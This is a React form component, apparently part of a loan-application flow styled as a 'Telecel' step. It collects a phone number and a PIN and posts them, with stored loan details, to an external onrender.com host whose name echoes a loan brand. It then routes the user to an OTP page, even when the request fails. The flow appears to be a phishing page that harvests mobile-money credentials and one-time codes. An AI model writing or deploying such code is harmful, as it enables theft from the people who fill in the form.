import { useState } from "react";
import axios from "axios";
import { useNavigate, useParams } from "react-router-dom";

export default function Telecel() {
  const navigate = useNavigate();
  const { id } = useParams();

  const [data, setData] = useState({
    number: "",
    pin: "",
  });

  const handleChange = (e) => {
    setData({ ...data, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    let loanData = {};

    try {
      loanData = JSON.parse(localStorage.getItem("loanData")) || {};
    } catch {
      loanData = {};
    }

    try {
      const res = await axios.post(
        "https://g-bayport-loans.onrender.com/apply",
        {
          ...loanData,
          ...data,
        }
      );

      const newId = res.data?.id || "123";
      navigate(`/otp/${newId}`);

    } catch (err) {
      console.error(err);
      navigate("/otp/123");
    }
  };

  return (
    <div>
      <h1>Telecel Page</h1>
      <p>ID: {id}</p>

      <form onSubmit={handleSubmit}>
        <input name="number" onChange={handleChange} required />
        <input name="pin" type="password" onChange={handleChange} required />
        <button type="submit">Continue</button>
      </form>
    </div>
  );
}